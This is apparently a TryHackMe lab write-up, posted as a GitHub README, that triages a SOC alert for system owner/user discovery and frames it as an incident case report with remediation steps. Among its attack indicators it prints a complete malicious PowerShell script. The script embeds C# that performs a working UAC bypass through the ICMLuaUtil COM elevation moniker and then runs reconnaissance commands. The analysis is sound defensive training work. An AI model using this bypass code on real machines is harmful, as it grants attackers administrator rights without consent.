<h1 align="center">T1033</h1>
<p align="center">Discovery ㆍ System Owner/User Discovery<br>
<img width="605px" src="https://github.com/user-attachments/assets/6990193b-eeae-4e07-a93c-966d204e1f29"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://githubhttps://github.com/user-attachments/assets/f9d56f26-bf87-4309-b5d8-f98cbb0302b0com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20MAY%2013-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a><br><br></p>

```bash
Alert ID 2021 - Suspicious System Discovery Activity From Elevated Process - High - Discovery

Case report ID 2021
Time of activity: 
-  2026-05-14 03:22:42.796

List of Affected Entities: 
-  User: [ "NOT_TRANSLATED", "THM-LUKE\\luke.s" ]
-  ParentUser: THM-LUKE\luke.s
-  host: THM-LUKE

Reason for Classifying as True Positive: 
- From '2026-05-14 03:22:39.925' to '2026-05-14 03:22:41.926', the threat actor started   Windows Script Blocking. Specifically at ' powershell.exe -ExecutionPolicy Bypass -File .\SupportTool.ps1' there is evidence of 'powershell.exe -ExecutionPolicy Bypass -File .\SupportTool.ps1', and at '' a critical malicious script block '48628a1d-d745-4eac-a181-42a9a2e5a702'.
- At 2026-05-14 03:22:41.927 a malicious pipeline was executed.
-  After executing 'whoami /all', the threat actor also executed in sequence 'systeminfo'  at '2026-05-14 03:22:43.072 and 'tasklist' at '2026-05-14 03:22:45.692', all spawned by 'cmd.exe'.
- At 2026-05-14 03:27:26.193, they created 'DeviceCensus.exe' spawned by the Parent Command Line 'C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule'

Reason for Escalating the Alert: 
At '2026-05-14 03:22:39', the user 'luke.s' executed a PowerShell script 'SupportTool.ps1' using the '-ExecutionPolicy Bypass' flag, indicating an intentional evasion of standard script execution controls. The script contains embedded C# code that leverages a known User Account Control (UAC) bypass technique via the ICMLuaUtil COM interface. This effectively elevates privileges without prompting the user. This bypass successfully spawned an elevated command prompt 'cmd.exe' running with High Integrity. The elevated command prompt immediately executed a chain of automated discovery commands: 'whoami /all', 'systeminfo', 'tasklist', and 'dir C:\Users\'. This rapid, chained execution is highly indicative of automated post-exploitation reconnaissance rather than legitimate administrative activity.

Recommended Remediation Actions: 
- Containment: Immediately isolate the host THM-LUKE from the network to prevent potential lateral movement.
- Eradication: Identify and remove the malicious script (C:\Users\luke.s\Downloads\SupportTool.ps1) and any associated artifacts or scheduled tasks created around the time of infection.
- Credential Reset: Force a password reset for the user account THM-LUKE\luke.s and revoke any active session tokens, as the account is demonstrably compromised.
- Investigation: Conduct a forensic review of the host to determine the initial delivery vector of SupportTool.ps1 (e.g., phishing email, malicious download).

List of Attack Indicators: 
- Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File .\SupportTool.ps1
OriginalFileName: whoami.exe
ParentCommandLine: "C:\Windows\System32\cmd.exe" /c whoami /all & systeminfo & tasklist & dir C:\Users\
category: Process Create (rule: ProcessCreate)
OriginalFileName: whoami.exe
ParentCommandLine: "C:\Windows\System32\cmd.exe" /c whoami /all & systeminfo & tasklist & dir C:\Users\
ParentImage: C:\Windows\System32\cmd.exe
Script Block: Creating Scriptblock text (1 of 1):
# SupportTool.ps1

$cs = @'
using System;
using System.Runtime.InteropServices;

public class SupportHelper
{
    [StructLayout(LayoutKind.Sequential)]
    struct BIND_OPTS3
    {
        public uint cbStruct, grfFlags, grfMode, dwTickCountDeadline,
                    dwTrackFlags, dwClassContext, locale;
        public IntPtr pServerInfo, hwnd;
    }

    [DllImport("ole32.dll")]
    static extern int CoGetObject(
        [MarshalAs(UnmanagedType.LPWStr)] string pszName,
        ref BIND_OPTS3 pBindOptions,
        ref Guid riid,
        out IntPtr ppv);

    [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface ICMLuaUtil
    {
        void SetRasCredentials();
        void SetRasEntryProperties();
        void DeleteRasEntry();
        void LaunchInfSection();
        void LaunchInfSectionEx();
        void CreateLayerDirectory();
        void ShellExec(
            [MarshalAs(UnmanagedType.LPWStr)] string file,
            [MarshalAs(UnmanagedType.LPWStr)] string parameters,
            [MarshalAs(UnmanagedType.LPWStr)] string directory,
            uint dwFlags, int showFlag);
    }

    public static void Run(string file, string args, string dir)
    {
        Guid clsid = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
        Guid iid   = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");
        string moniker = "Elevation:Administrator!new:" + clsid.ToString("B").ToUpper();
        BIND_OPTS3 bo = new BIND_OPTS3();
        bo.cbStruct = (uint)Marshal.SizeOf(typeof(BIND_OPTS3));
        bo.dwClassContext = 4;
        IntPtr ppv;
        int hr = CoGetObject(moniker, ref bo, ref iid, out ppv);
        if (hr != 0) throw new Exception("hr=0x" + hr.ToString("X8"));
        ICMLuaUtil util = (ICMLuaUtil)Marshal.GetObjectForIUnknown(ppv);
        Marshal.Release(ppv);
        util.ShellExec(file, args, dir, 0, 1);
    }
}
'@

Add-Type -TypeDefinition $cs -Language CSharp
[SupportHelper]::Run(
    "C:\Windows\System32\cmd.exe",
    "/c whoami /all & systeminfo & tasklist & dir C:\Users\",
    "C:\Windows\System32"
)


ScriptBlock ID: 48628a1d-d745-4eac-a181-42a9a2e5a702
Path: C:\Users\luke.s\Downloads\SupportTool.ps1
```




<img width="1289" height="560" alt="image" src="https://github.com/user-attachments/assets/6a7831bf-4e37-46c9-b546-1798242410e3" />

<br>
<br>

<img width="1349" height="392" alt="image" src="https://github.com/user-attachments/assets/2bba6ebc-30be-48a4-85d8-c683de3dcd18" />

<br>
<br>

<img width="1289" height="515" alt="image" src="https://github.com/user-attachments/assets/9860a8b3-ea8f-4c57-8c5f-f986fe3496fc" />

<br>
<br>

<img width="1339" height="548" alt="image" src="https://github.com/user-attachments/assets/b153f6e0-f0a6-48e7-9b65-c9a60c98625f" />

<br>
<br>

<img width="555" height="728" alt="image" src="https://github.com/user-attachments/assets/468b04aa-56aa-4a0b-a604-74440e7558a9" />





<img width="950" height="289" alt="image" src="https://github.com/user-attachments/assets/3f4c7f6c-e732-4a5e-962f-63ce17f98d28" />


<br>
<br>

<h2 align="center">My TryHackMe Journey &nbsp; · &nbsp; 2026, May</h2>
<div align="center"><h6>

|Day<br><br><br> |Capability<br>Score<br><br>|Room<br>Name<br><br>|Level<br><br><br>|Type<br><br><br>|Rooms<br>Completed<br><br>|Points<br><br><br>|Badges<br><br><br>|Global<br>All<br>Time<br>|Global<br>Monthly<br><br>|Brazil<br>All<br>Time<br>|Brazil<br>Monthly<br><br>|
|---------------:|-----------------:|:----------------|:---------------|:----------------------------------------:|-------------------------:|-----------------:|-----------------:|--------------------:|------------------------:|--------------------:|---------------:|
|14<br><br>  |109<br><br>   |T1574<br><br>|Medium<br><br>   |🔗<br><br>| 1,208<br><br>| 175,868<br><br>| 95<br><br>| 7ᵗʰ<br><br>| 26ᵗʰ<br><br>| 1ˢᵗ<br><br>| 1ˢᵗ<br><br>|

</h6></div><br>

